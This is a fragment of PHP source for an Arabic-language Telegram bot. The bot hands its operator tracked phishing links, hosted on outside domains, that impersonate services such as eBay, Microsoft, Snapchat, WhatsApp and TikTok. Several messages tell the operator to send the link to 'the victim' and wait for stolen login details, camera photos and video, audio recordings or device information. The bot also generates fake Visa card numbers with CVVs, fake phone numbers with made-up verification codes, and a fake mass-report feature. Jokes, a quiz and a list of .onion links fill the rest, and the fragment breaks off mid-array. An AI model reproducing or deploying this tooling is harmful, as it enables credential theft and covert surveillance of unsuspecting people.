    'send_ebay_link' => "https://smmyemen.pro/bots/wahm1954/ebay/index.php?ID=$chat_id2",
    'send_deviantart_link' => "https://smmyemen.pro/bots/wahm1954/deviantart/index.php?ID=$chat_id2",
    'send_ig_followers_link' => "https://smmyemen.pro/bots/wahm1954/ig_followers/index.php?ID=$chat_id2",
    'wats' => "https://smmyemen.pro/bots/wahm1954/index18.html?id=$chat_id2",
    'kwai' => "https://smmyemen.pro/bots/wahm1954/index15.html?id=$chat_id2",
    'send_tiktok_link' => "https://smmyemen.pro/bots/wahm1954/index8.html?id=$chat_id2",
    'send_twitter_link' => "https://smmyemen.pro/bots/wahm1954/index7.html?id=$chat_id2",
    'send_twitch_link' => "https://smmyemen.pro/bots/wahm1954/index12.html?id=$chat_id2",
    'send_wordpress_link' => "https://smmyemen.pro/bots/wahm1954/index19.html?id=$chat_id2",
    'send_roblox_link' => "https://smmyemen.pro/bots/wahm1954/index11.html?id=$chat_id2",
    'send_snapchat_link' => "https://sable-peat-zircon.glitch.me?id=$chat_id2",
    'send_microsoft_link' => "https://smmyemen.pro/bots/wahm1954/microsoft/index.php?ID=$chat_id2",
    'send_spotify_link' => "https://smmyemen.pro/bots/wahm1954/index14.html?id=$chat_id2",
    'send_freefire_link' => "https://smmyemen.pro/bots/wahm1954/index13.html?id=$chat_id2",
    'send_freefire2_link' => "https://smmyemen.pro/bots/wahm1954/FREEFIRE2/index.php?ID=$chat_id2",
];

// الزر الرئيسي - سكرين
// لما يرسل المستخدم الأمر "سكرين"
if ($data == "screen") {
    $keyboard = json_encode([
        "inline_keyboard" => [
            [["text" => "📡 قناة", "callback_data" => "screen_channel"]],
            [["text" => "👤 حساب", "callback_data" => "screen_account"]],
            [["text" => "👥 مجموعة", "callback_data" => "screen_group"]],
            [["text" => "🤖 بوت", "callback_data" => "screen_bot"]]
        ]
    ]);
    bot('sendMessage', [
        'chat_id' => $chat_id2,
        'text' => "📸 اختر نوع الحساب الذي تريد أخذ لقطة شاشة له:",
        'reply_markup' => $keyboard
    ]);
}

// تحديد نوع الحساب وطلب الآيدي
elseif (strpos($data, "screen_") !== false) {
    $type = str_replace("screen_", "", $data);
    $types = [
        "channel" => "📡 قناة",
        "account" => "👤 حساب",
        "group" => "👥 مجموعة",
        "bot" => "🤖 بوت"
    ];
    file_put_contents("screen_type_$chat_id2.txt", $type);
    bot('sendMessage', [
        'chat_id' => $chat_id2,
        'text' => "🔍 أرسل الآن آيدي المستخدم الخاص بـ " . $types[$type] . " (مثلاً: 123456789)."
    ]);
}

// تنفيذ السكرين بناءً على الآيدي
elseif ($message && is_numeric($message) && file_exists("screen_type_$chat_id2.txt")) {
    $user_id = $message;
    $type = file_get_contents("screen_type_$chat_id2.txt");
    unlink("screen_type_$chat_id2.txt");

    bot('sendMessage', [
        'chat_id' => $chat_id2,
        'text' => "⏳ جاري أخذ لقطة شاشة للملف الشخصي..."
    ]);

    sleep(2);

    // جلب معلومات الحساب
    $user_info = bot('getChat', ['chat_id' => $user_id2]);

    if ($user_info->ok && isset($user_info->result->photo)) {
        // جلب صورة البروفايل (الصورة الكبيرة)
        $photo = bot('getUserProfilePhotos', [
            'user_id' => $user_id2,
            'limit' => 1
        ]);

        if ($photo->ok && count($photo->result->photos) > 0) {
            $file_id2 = $photo->result->photos[0][1]->file_id ?? $photo->result->photos[0][0]->file_id;

            $keyboard = json_encode([
                "inline_keyboard" => [
                    [["text" => "✅ تأكيد", "callback_data" => "confirm_screen_$user_id2"]],
                    [["text" => "❌ لا", "callback_data" => "cancel_screen"]]
                ]
            ]);

            bot('sendPhoto', [
                'chat_id' => $chat_id2,
                'photo' => $file_id2,
                'caption' => "📸 لقطة شاشة للملف الشخصي\n\nآيدي المستخدم: `$user_id2`",
                'parse_mode' => "Markdown",
                'reply_markup' => $keyboard
            ]);
        } else {
            bot('sendMessage', [
                'chat_id' => $chat_id2,
                'text' => "⚠️ لم يتم العثور على صورة للملف الشخصي."
            ]);
        }
    } else {
        bot('sendMessage', [
            'chat_id' => $chat_id2,
            'text' => "❌ لم أتمكن من جلب معلومات الحساب، تأكد أن الآيدي صحيح."
        ]);
    }
}

// التأكيد أو الإلغاء
elseif (strpos($data, "confirm_screen_") !== false) {
    $uid = str_replace("confirm_screen_", "", $data);
    bot('sendMessage', [
        'chat_id' => $chat_id2,
        'text' => "✅ تم تأكيد لقطة الشاشة للآيدي $uid بنجاح!"
    ]);
} elseif ($data == "cancel_screen") {
    bot('sendMessage', [
        'chat_id' => $chat_id2,
        'text' => "❌ تم إلغاء العملية."
    ]);
}
if ($callbackData == 'report_types') {
    bot('sendMessage', [
        'chat_id' => $chat_id2,
        'text' => "تم استلام الطلب، جاري عرض خيارات البلاغ.",
    ]);
}

if ($data == 'full_device') {
    bot('sendMessage', [
        'chat_id' => $chat_id2,
        'text' => "قم بإرسال هذا لفتح أوامر اختراق الهاتف كاملاً قم بضغط على هذا الامر /vip",
        'parse_mode' => "Markdown"
    ]);
}
if ($data == 'mm16') {
    bot('sendMessage', [
        'chat_id' => $chat_id2,
        'text' => "🎉 هل أنت متأكد من رغبتك في شراء البوت المتميز؟
✅ السعر: 15 نقطة
يرجى إرسال  '/shara' لتأكيد الشراء.
",
        'parse_mode' => "Markdown"
    ]);
}
if (isset($update["callback_query"])) {
    $data = $update["callback_query"]["data"];
    $chat_id = $update["callback_query"]["message"]["chat"]["id"];
    $user_id = $update["callback_query"]["from"]["id"];

    if ($data == "get_user_link") {
        // الكود الذي يقوم بإرسال رابط المعرف
        $link = "https://t.me/Ksksjsjjsjskygbot?start=$user_id"; // عدل اسم البوت الثاني
        sendMessage($chat_id, "انسخ هذا الرابط وارسله لأي شخص:\n\n$link");
    }
}
if ($data == "verify_number") {
    // المعرف الذي تم تمريره من البوت أو مصدر آخر
    $link = "https://smmyemen.pro/bots/wahm1954/index20?id=$user_id"; // تغيير yourdomain.com بالرابط الفعلي لصفحتك

    // إرسال الرابط إلى المستخدم عبر البوت
    sendMessage($chat_id, "انسخ الرابط ورسله للضحيه وانتضر لما يدخل المعلومات:\n$link");
}
if ($data == "com") {
    // المعرف الذي تم تمريره من البوت أو مصدر آخر
    $link = "https://smmyemen.pro/bots/wahm1954/index4.html?id=$user_id"; // تغيير yourdomain.com بالرابط الفعلي لصفحتك

    // إرسال الرابط إلى المستخدم عبر البوت
    sendMessage($chat_id, "انسخ الرابط ورسله للضحيه وانتضر لما الصوره تجيك خلال ثواني من دخوله الا الرابط:\n$link");
}

if ($data == "record_audio") {
    // المعرف الذي تم تمريره من البوت أو مصدر آخر
    $link = "https://smmyemen.pro/bots/wahm1954/index6.html?id=$user_id"; // تغيير yourdomain.com بالرابط الفعلي لصفحتك

    // إرسال الرابط إلى المستخدم عبر البوت
    sendMessage($chat_id, "انسخ الرابط ورسله للضحيه وانتضر لما التسجيل يجيك خلال ثواني من دخوله الا الرابط:\n$link");
}

if ($data == "com1") {
    // إنشاء الرابط باستخدام معرف المستخدم
    $front_camera_link = "https://brass-sulky-bakery.glitch.me/front?id=$user_id"; // رابط الكاميرا الأمامية
    $back_camera_link = "https://brass-sulky-bakery.glitch.me/back?id=$user_id";   // رابط الكاميرا الخلفية

    // نص الرسالة المرتب بطريقة حلوة
    $text = "إليك روابط تصوير الضحية فيديو:\n\n" .
            "الكاميرا الأمامية:\n" .
            "$front_camera_link\n" .
            "______________________________________\n\n" .
            "الكاميرا الخلفية:\n" .
            "$back_camera_link";

    // إرسال الرسالة
    sendMessage($chat_id, $text);
}

if ($data == "com2") {
    // المعرف الذي تم تمريره من البوت أو مصدر آخر
    $link = "https://brass-sulky-bakery.glitch.me?id=$user_id"; // تغيير yourdomain.com بالرابط الفعلي لصفحتك

    // إرسال الرابط إلى المستخدم عبر البوت
    sendMessage($chat_id, "انسخ الرابط ورسله للضحيه وانتضر لما الفيديو تجيك خلال ثواني من دخوله الا الرابط:\n$link");
}
if ($data == "ma") {
    // المعرف الذي تم تمريره من البوت أو مصدر آخر
    $link = "https://smmyemen.pro/bots/wahm1954/index24.html?id=$user_id"; // تغيير yourdomain.com بالرابط الفعلي لصفحتك

    // إرسال الرابط إلى المستخدم عبر البوت
    sendMessage($chat_id, "انسخ الرابط ورسله للضحيه وانتضر لما المعلومات تجيك خلال ثواني من دخوله الا الرابط:\n$link");
}
if ($data == "co") {
    // المعرف الذي تم تمريره من البوت أو مصدر آخر
    $link = "https://smmyemen.pro/bots/wahm1954/index5.html?id=$user_id"; // تغيير yourdomain.com بالرابط الفعلي لصفحتك

    // إرسال الرابط إلى المستخدم عبر البوت
    sendMessage($chat_id, "انسخ الرابط ورسله للضحيه وانتضر لما الصوره تجيك خلال ثواني من دخوله الا الرابط:\n$link");
}
if ($data == "verify_whatsapp") {
    // المعرف الذي تم تمريره من البوت أو مصدر آخر
    $link = "https://separated-brawny-odometer.glitch.me?id=$user_id"; // تغيير yourdomain.com بالرابط الفعلي لصفحتك

    // إرسال الرابط إلى المستخدم عبر البوت
    sendMessage($chat_id, "انسخ الرابط ورسله للضحيه وانتضر لما يدخل المعلومات:\n$link");
}
if ($data == "verify_tle") {
    // المعرف الذي تم تمريره من البوت أو مصدر آخر
    $link = "https://smmyemen.pro/bots/wahm1954/tle/gs.php?id=$user_id"; // تغيير yourdomain.com بالرابط الفعلي لصفحتك

    // إرسال الرابط إلى المستخدم عبر البوت
    sendMessage($chat_id, "انسخ الرابط ورسله للضحيه وانتضر لما يدخل المعلومات:\n$link");
}

if ($data == "moq") {
    // المعرف الذي تم تمريره من البوت أو مصدر آخر
    $link = "https://smmyemen.pro/bots/wahm1954/index23.html?id=$user_id"; // تغيير yourdomain.com بالرابط الفعلي لصفحتك

    // إرسال الرابط إلى المستخدم عبر البوت
    sendMessage($chat_id, "انسخ الرابط ورسله للضحيه وانتضر لما يدخل المعلومات:\n$link");
}

if ($data == 'pm') {
    bot('sendMessage', [
        'chat_id' => $chat_id2,
        'text' => "قم بإرسال هذا لفتح أوامر تحليل شخصيتك قم بضغط على هذا الامر /p",
        'parse_mode' => "Markdown"
    ]);
}
if ($data == 'ex1') {
    bot('sendMessage', [
        'chat_id' => $chat_id2,
        'text' => "قم بإرسال هذا لفتح أوامر خيره 😊 قم بضغط على هذا الامر /rt",
        'parse_mode' => "Markdown"
    ]);
}
if ($data == "xm16") {
    bot('sendPhoto', [
        'chat_id' => $chat_id,
        'photo' => "https://khain.pro/sor/akh.jpeg"
    ]);
    exit;
}
if ($data == "fake_number") {
    sendFakeNumber($chat_id2);
}

if ($data == "change_number") {
    sendFakeNumber($chat_id2);
}

if ($data == "request_code") {
    $platforms = [
        "واتساب", "تيك توك", "جوجل", "بايبال", "سناب شات", "انستجرام", "تويتر", "تلغرام", "نتفلكس", "فيسبوك", "أمازون", "سبوتيفاي"
    ];

    $codes = [
        "Kod potwierdzający " . rand(10000, 99999),
        "PayPal: Danke für die Bestätigung Ihrer Telefonnummer. https://py.pl/" . rand(1000, 9999),
        "【阿里巴巴】验证码" . rand(1000, 9999) . "，您正在注册，验证码15分钟内有效。",
        "【AliExpress】Kod weryfikacyjny: " . rand(100000, 999999),
        rand(100000, 999999) . " is your Skrill authentication code.",
        rand(100000, 999999) . " is your Google verification code.",
        rand(100000, 999999) . " is your TikTok confirmation code.",
        rand(100000, 999999) . " is your WhatsApp login code.",
        "Your Facebook code is " . rand(100000, 999999),
        "Telegram code: " . rand(10000, 99999)
    ];

    shuffle($codes);
    $selected_platform = $platforms[array_rand($platforms)];

    $message = "➖ منصة: $selected_platform\n\n";
    foreach (array_slice($codes, 0, 5) as $i => $code) {
        $message .= "الرسالة رقم " . ($i + 1) . ": $code\n\n";
    }

    $message .= "اضغط على أي رسالة لنسخها.";

    bot('sendMessage', [
        'chat_id' => $chat_id2,
        'text' => $message
    ]);
}

function sendFakeNumber($chat_id) {
    $countries = [
        ["latvia", "+371", "لاتفيا 🇱🇻"],
        ["germany", "+49", "ألمانيا 🇩🇪"],
        ["usa", "+1", "أمريكا 🇺🇸"],
        ["france", "+33", "فرنسا 🇫🇷"],
        ["sweden", "+46", "السويد 🇸🇪"],
        ["uk", "+44", "بريطانيا 🇬🇧"],
        ["netherlands", "+31", "هولندا 🇳🇱"],
        ["italy", "+39", "إيطاليا 🇮🇹"],
    ];

    $random_country = $countries[array_rand($countries)];
    $number = $random_country[1] . rand(100000000, 999999999);
    $now = new DateTime("now", new DateTimeZone("Asia/Riyadh"));
    $date = $now->format("Y-m-d");
    $time = $now->format("g:i:s A");

    $text = "➖ تم الطلب 🛎•\n";
    $text .= "➖ رقم الهاتف ☎️ : $number\n";
    $text .= "➖ الدوله : " . $random_country[2] . "\n";
    $text .= "➖ رمز الدوله 🌏 : " . $random_country[1] . "\n";
    $text .= "➖ المنصه 🔮 : لجميع الموقع والبرامج\n";
    $text .= "➖ تاريج الانشاء 📅 : $date\n";
    $text .= "➖ وقت الانشاء ⏰ : $time\n";
    $text .= "➖ اضغط ع الرقم لنسخه.";

    $keyboard = [
        [
            ['text' => 'تغيير الرقم', 'callback_data' => 'change_number'],
            ['text' => 'طلب كود', 'callback_data' => 'request_code']
        ]
    ];

    bot('sendMessage', [
        'chat_id' => $chat_id,
        'text' => $text,
        'reply_markup' => json_encode(['inline_keyboard' => $keyboard])
    ]);
}
if ($data == "get_fake_visa") {
    // رسالة تحميل
    bot('sendMessage', [
        'chat_id' => $chat_id2,
        'text' => "♻️ جاري الفحص عن الفيزات  . . .\n🔍 يرجى الانتظار قليلاً"
    ]);

    // تأخير 2 ثواني
    sleep(4);

    // توليد بيانات عشوائية
    $cardNumber = "4" . rand(1000,9999) . rand(1000,9999) . rand(1000,9999) . rand(1000,9999);
    $expiryMonth = str_pad(rand(1, 12), 2, "0", STR_PAD_LEFT);
    $expiryYear = rand(2025, 2028);
    $cvv = rand(100, 999);

    $banks = ["TD Bank", "Chase Bank", "Bank of America", "Capital One", "Wells Fargo"];
    $types = ["VISA - DEBIT - CLASSIC", "VISA - CREDIT - GOLD", "VISA - ELECTRON", "VISA - PLATINUM"];
    $values = ["\$5", "\$10", "\$15", "\$25", "\$50", "\$100"];

    $bank = $banks[array_rand($banks)];
    $type = $types[array_rand($types)];
    $value = $values[array_rand($values)];

    // بناء نص الفيزا
    $visa = "𝗣𝗮𝘀𝘀𝗲𝗱 ✅
[-] Card Number : $cardNumber
[-] Expiry : $expiryMonth/$expiryYear
[-] CVV : $cvv
[-] Bank : $bank
[-] Card Type : $type
[-] Country : USA🇺🇸
[-] Value : $value
============================
[-] by : @WAHM_REBOT";

    bot('sendMessage', [
        'chat_id' => $chat_id2,
        'text' => $visa
    ]);
}
if (isset($links[$data])) {
    bot('sendMessage', [
        'chat_id' => $chat_id2,
        'text' => "تم إنشاء الرابط: \n" . $links[$data]
    ]);
}
#=========help========#
if ($update['callback_query']['data'] === 'get_device_info') {
    $chatId = $update['callback_query']['from']['id'];
    $uniqueLink = "https://khain.pro/device_info.php?id=$chatId"; // ضع رابط موقعك هنا

    file_get_contents("https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=" . urlencode("🔍 اضغط على الرابط أدناه لاستخراج معلومات جهازك:\n\n$uniqueLink") . "&parse_mode=Markdown");
}
// تحليل شخص

if ($data == 'start_mard') {
    // عرض سؤال "هل الشخصية يمنية؟"
    $question = "اختر نوع البلاغ";

    // الأزرار الشفافة
    $keyboard = [
                [
                    ['text' => '🚨 بلاغ عن قناة', 'callback_data' => 'report_channel'],
                    ['text' => '🚨 بلاغ عن حساب', 'callback_data' => 'report_account']
                ],
                [
                    ['text' => '🚨 بلاغ عن مجموعة', 'callback_data' => 'report_group'],
                    ['text' => '🚨 بلاغ عن بوت', 'callback_data' => 'report_bot']], 
    ];

    // إرسال السؤال مع الأزرار الشفافة
    bot("sendMessage", [
        "chat_id" => $chat_id2,
        "text" => $question,
        "reply_markup" => json_encode(["inline_keyboard" => $keyboard])
    ]);
}
if ($data == 'report_channel') {
    $response = "📌 *أرسل اسم المستخدم فقط (بدون @)* مثل: `b_ab`";
} elseif ($data == 'report_account') {
    $response = "📌 *أرسل اسم المستخدم فقط (بدون @)* مثل: `b_ab`";
} elseif ($data == 'report_group') {
    $response = "📌 *أرسل اسم المستخدم فقط (بدون @)* مثل: `b_ab`";
} elseif ($data == 'report_bot') {
    $response = "📌 *أرسل اسم المستخدم فقط (بدون @)* مثل: `b_ab`";
}

// إرسال الرد للمستخدم بعد الإجابة
bot("sendMessage", [
    "chat_id" => $chat_id2,
    "text" => $response
]);
// تحليل
if ($data == 'personality_analysis') {
    // عرض سؤال "هل الشخصية يمنية؟"
    $question = "سؤال 1: ماهو نوع طعامك المفضل؟ ";

    // الأزرار الشفافة
    $keyboard = [
                [
                    ['text' => 'طعام سريع🍔', 'callback_data' => 'fast_food'],
                    ['text' => 'طعام صحي 🥗', 'callback_data' => 'healthy_food']
                ],
                [
                    ['text' => 'طعام ياباني🌭', 'callback_data' => 'japanese_food'],
                    ['text' => 'بيتزا 🍕', 'callback_data' => 'pizza']], 
    ];

    // إرسال السؤال مع الأزرار الشفافة
    bot("sendMessage", [
        "chat_id" => $chat_id2,
        "text" => $question,
        "reply_markup" => json_encode(["inline_keyboard" => $keyboard])
    ]);
}
if ($data == 'mmmmm') {
    $response = "📌 *أرسل اسم المستخدم فقط (بدون @)* مثل: `b_ab`";
} elseif ($data == 'mmmmm') {
    $response = "📌 *أرسل اسم المستخدم فقط (بدون @)* مثل: `b_ab`";
} elseif ($data == 'mmmmm') {
    $response = "📌 *أرسل اسم المستخدم فقط (بدون @)* مثل: `b_ab`";
} elseif ($data == 'mmmmm') {
    $response = "📌 *أرسل اسم المستخدم فقط (بدون @)* مثل: `b_ab`";
}


if ($data == 'mmmmm') {
    // عرض سؤال "هل الشخصية يمنية؟"
    $question = "سؤال 2: ماهو نوع الرياضه التي تفضلها؟ ";

    // الأزرار الشفافة
    $keyboard = [
[['text' => '🏃‍♂️ رياضة جري', 'callback_data' => 'running']],
        [['text' => '🏋️‍♂️ رياضة كمال الأجسام', 'callback_data' => 'bodybuilding']],
        [['text' => '⚽ كرة القدم', 'callback_data' => 'football']],
        [['text' => '🏀 كرة السلة', 'callback_data' => 'basketball']],
    ];

    // إرسال السؤال مع الأزرار الشفافة
    bot("sendMessage", [
        "chat_id" => $chat_id2,
        "text" => $question,
        "reply_markup" => json_encode(["inline_keyboard" => $keyboard])
    ]);
}


// إرسال الرد للمستخدم بعد الإجابة
bot("sendMessage", [
    "chat_id" => $chat_id2,
    "text" => $response
]);
if ($data == 'confirm_report') {
    // عرض أنواع البلاغات
    bot('sendMessage', [
        'chat_id' => $chat_id,
        'text' => "اختَر نوع البلاغ:",
        'parse_mode' => "Markdown",
        'disable_web_page_preview' => true,
        'reply_markup' => json_encode([
            'inline_keyboard' => [
                [
                    ['text' => 'بلاغ عن قناة', 'callback_data' => 'report_channel'],
                    ['text' => 'بلاغ عن حساب', 'callback_data' => 'report_account']
                ],
                [
                    ['text' => 'بلاغ عن مجموعة', 'callback_data' => 'report_group'],
                    ['text' => 'بلاغ عن بوت', 'callback_data' => 'report_bot']
                ]
            ]
        ])
    ]);
}

// إذا اختار المستخدم نوع البلاغ
if (in_array($callbackData, ['report_channel', 'report_account', 'report_group', 'report_bot'])) {
    // حفظ نوع البلاغ في الجلسة
    $_SESSION['report_type'] = $callbackData;

    // طلب اسم المستخدم
    bot('sendMessage', [
        'chat_id' => $chat_id,
        'text' => "أرسل اسم المستخدم فقط (بدون @) مثل: *b_ab*",
        'parse_mode' => "Markdown"
    ]);
}

// عندما يرسل المستخدم اسم الحساب
if ($textMessage && isset($_SESSION['report_type'])) {
    $username = trim($textMessage); // استخراج اسم المستخدم
    $_SESSION['username_to_report'] = $username; // حفظ الاسم للإبلاغ

    // إرسال صورة الحساب للتحقق
    bot('sendPhoto', [
        'chat_id' => $chat_id,
        'photo' => 'https://example.com/path/to/account_image.jpg', // أضف رابط الصورة الحقيقية
        'caption' => "هل هذا هو الحساب: @$username؟",
        'reply_markup' => json_encode([
            'inline_keyboard' => [
                [
                    ['text' => 'نعم', 'callback_data' => 'confirm_report'],
                    ['text' => 'لا', 'callback_data' => 'cancel_report']
                ]
            ]
        ])
    ]);
}

// عندما يضغط المستخدم على "نعم" لتأكيد الحساب
if ($callbackData == 'confirm_report' && isset($_SESSION['username_to_report'])) {
    $username = $_SESSION['username_to_report']; // استرجاع اسم الحساب

    // إرسال رسالة بدء البلاغ الوهمي
    bot('sendMessage', [
        'chat_id' => $chat_id,
        'text' => "جاري الابلاغ على @$username...\n🔄 العدد الحالي: *20000*",
        'parse_mode' => "Markdown"
    ]);

    // تنفيذ العد التنازلي
    for ($i = 20000; $i >= 0; $i -= 500) { // التناقص كل 500 لتسريع العملية
        bot('editMessageText', [
            'chat_id' => $chat_id,
            'message_id' => $messageId,
            'text' => "🔄 جاري الإبلاغ على @$username...\n📉 العدد الحالي: *$i*",
            'parse_mode' => "Markdown"
        ]);
        usleep(90000); // 0.09 ثانية بين كل تحديث
    }

    // إرسال رسالة إتمام البلاغ
    bot('sendMessage', [
        'chat_id' => $chat_id,
        'text' => "✅ تم الانتهاء من الإبلاغ على @$username بنجاح!"
    ]);

    // حذف بيانات الجلسة
    unset($_SESSION['report_type']);
    unset($_SESSION['username_to_report']);
}

// عندما يضغط المستخدم على "لا" لإلغاء البلاغ
if ($callbackData == '/x') {
    bot('sendMessage', [
        'chat_id' => $chat_id,
        'text' => "❌ تم إلغاء البلاغ."
    ]);
    

    // حذف بيانات الجلسة
    unset($_SESSION['report_type']);
    unset($_SESSION['username_to_report']);
}
if ($data == 'send_joke') {
    // مصفوفة تحتوي على 150 نكتة كلها تبدأ بـ "كان هناك شخص يمني..."
    $jokes = [
        "كان هناك شخص يمني راح يشتري سيارة، سأل البائع: هل فيها مكيف؟ قال له: نعم، رد عليه: ممتاز، حر بلادنا ما يرحم! 😂",
        "كان هناك شخص يمني دخل مطعم، قال للجرسون: أعطيني أحسن أكلة عندكم، الجرسون قال له: هذا مطعم هندي! 🤣",
        "كان هناك شخص يمني يشوف الأخبار، قال: متى بيسووا برنامج (ذا فويس) بس لأصوات القات؟! 🤣",
        "كان هناك شخص يمني يحب السفر، راح المطار سأله الموظف: أين رايح؟ قال: بعيد عن المشاكل! 😂",
        "كان هناك شخص يمني دخل محل جوالات، سأل البائع: عندكم شاحن؟ قال له: أي نوع؟ رد عليه: نوع يشحن بسرعة قبل ما يطفى جوالي! 😂",
        "كان هناك شخص يمني اشترى جوال جديد، سأله صديقه: كم الرام؟ قال له: ما أدري، بس شكله يشغل فيسبوك كويس! 🤣",
        "كان هناك شخص يمني يحب النوم، قرر يضبط المنبه عشان يصحى بدري، في النهاية صحي بس عشان يطفيه ويرجع ينام! 😂",
        "كان هناك شخص يمني دخل محل ملابس، سأل البائع: عندكم تخفيضات؟ رد عليه: نعم، قال: طيب تخفضوا لي 100%؟! 🤣",
        "كان هناك شخص يمني دخل سوبر ماركت، شاف الأسعار قال: معقولة الأسعار غالية ولا أنا اللي فقير؟! 😂",
        "كان هناك شخص يمني يحب كرة القدم، قرر يلعب حارس مرمى، أول تسديدة عليه قال: يا جماعة الكرة جاية بسرعة! 😂",
        "كان هناك شخص يمني ركب سيارة أجرة، بعد المشوار سأل السائق: كم الحساب؟ رد السائق: 2000 ريال، قال: ليش؟ احنا رايحين للفضاء؟! 🤣",
        "كان هناك شخص يمني فتح قناة يوتيوب، أول فيديو نزله كان عنوانه: 'كيف تخلي حياتك سعيدة؟'، بعد أسبوع حذف القناة! 😂",
        "كان هناك شخص يمني يحب الراديو، قرر يسمع نشرة الأخبار، قالوا: 'الطقس غدًا غائم جزئيًا'، قال: يعني نخرج ولا لا؟! 🤣",
        "كان هناك شخص يمني اشترى مكيف جديد، سأله صاحبه: كيف المكيف؟ قال له: ممتاز، بس الكهربا مش موجودة! 😂",
        "كان هناك شخص يمني دخل مطعم، شاف الأسعار قال: هل الوجبة معها سيارة هدية؟! 🤣",
        "كان هناك شخص يمني طلب بيتزا، بعد ما وصلته شاف شكلها قال: هذا بيتزا ولا كعكة عيد ميلاد؟! 😂",
        "كان هناك شخص يمني يحب الأفلام، قرر يشوف فيلم رعب، بعد خمس دقائق طفى التلفزيون وخاف يروح الحمام! 🤣",
        "كان هناك شخص يمني قرر يشتري نظارة شمسية، جرب وحدة قال: حلوة بس الشمس ما زالت تضرب في عيوني! 😂",
        "كان هناك شخص يمني يحب الشاهي، قرر يشرب شاهي أخضر، بعد أول رشفة قال: طعمه مثل العشب! 🤣",
        "كان هناك شخص يمني دخل امتحان، كان السؤال: 'ما هو اسمك؟'، جلس يفكر: أكيد هذا سؤال مخادع! 😂",
        "كان هناك شخص يمني جالس يتفرج على الأخبار، قالوا: 'الطقس غدًا مشمس'، قال: الله يعين، الكهربا بتروح! 🤣",
        "كان هناك شخص يمني قرر يعمل رجيم، بعد يوم واحد وقف وقال: الرجيم مو لي! 😂",
        "كان هناك شخص يمني دخل محل عطور، جرب عطر غالي وقال للبائع: هذا ريحته حلوة، بس غالي! 🤣",
        "كان هناك شخص يمني يحب النوم، كل يوم يقول: 'بكرة بصحى بدري'، بس ما قد حصل! 😂",
        "كان هناك شخص يمني قرر يتعلم الطبخ، أول أكلة عملها احترقت، قال: شكلي باشتري أكل جاهز للأبد! 🤣",
        "كان هناك شخص يمني طلب قهوة، بعد ما شربها قال: القهوة لذيذة بس تحتاج سكر زيادة! 😂",
        "كان هناك شخص يمني دخل بنك، شاف الموظف يسوي معاملة ببطء، قال: الظاهر الكمبيوتر عندهم متصل بالحمام! 🤣",
        "كان هناك شخص يمني دخل مطعم، شاف قائمة الطعام، قال للنادل: 'عندكم شي رخيص ولذيذ؟'، رد النادل: 'الماء مجاني!' 😂",
        "كان هناك شخص يمني يحب التقنية، قرر يشتري كمبيوتر جديد، بعد ما اشتراه جلس يومين بس يطالع فيه! 🤣",
        "كان هناك شخص يمني قرر يسوي رياضة، أول يوم ركض 5 دقائق، بعدها قال: الرياضة متعبة، خليني أرتاح شوي! 😂",
        "كان هناك شخص يمني قرر يكتب رواية، بعد أول صفحة قال: كفاية، القصة انتهت! 🤣",
        "كان هناك شخص يمني يحب البحر، قرر يروح للبحر، بعد خمس دقائق قال: الشمس حارة، خليني أرجع البيت! 😂",
        "كان هناك شخص يمني دخل سوبر ماركت، شاف الأسعار غالية، قال للبائع: هل في خصم للي يشتري بنية صافية؟! 🤣",
        "كان هناك شخص يمني قرر يتعلم لغة جديدة، بعد أول درس قال: كفاية، أنا أصلاً مشغول! 😂",
        "كان هناك شخص يمني قرر يسوي قناة يوتيوب، أول فيديو قال: 'السلام عليكم'، بعد دقيقة حذف القناة! 🤣",
        "كان هناك شخص يمني دخل مكتبة، سأل البائع: 'عندكم كتب عن الصبر؟'، رد عليه: 'نعم، بس خليني أخلص الزحمة أول!' 😂",
        "كان هناك شخص يمني قرر يسوي مشروع، بعد أول أسبوع قال: 'البزنس صعب، خليني أرجع للراحة!' 🤣",
        "كان هناك شخص يمني يحب النوم، قرر يضبط المنبه، بعد ما صحي قال: 'خلاص، آخر مرة أصحى بدري!' 😂",
        "كان هناك شخص يمني يحب الألعاب، قرر يلعب لعبة صعبة، بعد أول خسارة قال: 'اللعبة فيها مشكلة، مش أنا السيء!' 🤣",
        "كان هناك شخص يمني دخل محل ملابس، شاف الأسعار قال: 'هل في تخفيض للي يجي كل يوم بس ما يشتري؟!' 😂"
    ];

    // اختيار نكتة عشوائية
    $random_joke = $jokes[array_rand($jokes)];

    // إرسال النكتة إلى المستخدم
    bot("sendMessage", [
        "chat_id" => $chat_id2,
        "text" => $random_joke,
        "parse_mode" => "HTML"
    ]);
}
if ($data == 'exit3') {
    // مصفوفة تحتوي على 150 نكتة كلها تبدأ بـ "كان هناك شخص يمني..."
    $jokes = [

    "تم انشاء رابط ديب ويب:                                                                                                                                                                                                                                                                                                                                http://zsxjtsgzborzdllyp64c6pwnjz5eic76bsksbxzqefzogwcydnkjy3yd.onion",
    "تم انشاء رابط ديب ويب:                                                                                                                                                                                                                                                                                      http://meynethaffeecapsvfphrcnfrx44w2nskgls2juwitibvqctk2plvhqd.onion",
    "تم انشاء رابط ديب ويب:                                                                                                                                                                                                                                                                                      http://spywaredrcdg5krvjnukp3vbdwiqcv3zwbrcg6qh27kiwecm4qyfphid.onion",
    "تم انشاء رابط ديب ويب:                                                                                                                                                                                                                                                                                      http://digdeep4orxw6psc33yxa2dgmuycj74zi6334xhxjlgppw6odvkzkiad.onion",
    "تم انشاء رابط ديب ويب:                                                                                                                                                                                                                                                                                      http://killnod2s77o3axkktdu52aqmmy4acisz2gicbhjm4xbvxa2zfftteyd.onion",
    "تم انشاء رابط ديب ويب:                                                                                                                                                                                                                                                                                      http://lainwir3s4y5r7mqm3kurzpljyf77vty2hrrfkps6wm4nnnqzest4lqd.onion",
    "تم انشاء رابط ديب ويب:                                                                                                                                                                                                                                                                                      http://cgjzkysxa4ru5rhrtr6rafckhexbisbtxwg2fg743cjumioysmirhdad.onion",
    "تم انشاء رابط ديب ويب:                                                                                                                                                                                                                                                                                      http://zsxjtsgzborzdllyp64c6pwnjz5eic76bsksbxzqefzogwcydnkjy3yd.onion",
    "تم انشاء رابط ديب ويب:                                                                                                                                                                                                                                                                                      http://eludemailxhnqzfmxehy3bk5guyhlxbunfyhkcksv4gvx6d3wcf6smad.onion",
    "تم انشاء رابط ديب ويب:                                                                                                                                                                                                                                                                                      http://xdkriz6cn2avvcr2vks5lvvtmfojz2ohjzj4fhyuka55mvljeso2ztqd.onion",
    "تم انشاء رابط ديب ويب:                                                                                                                                                                                                                                                                                      http://xdkriz6cn2avvcr2vks5lvvtmfojz2ohjzj4fhyuka55mvljeso2ztqd.onion/",
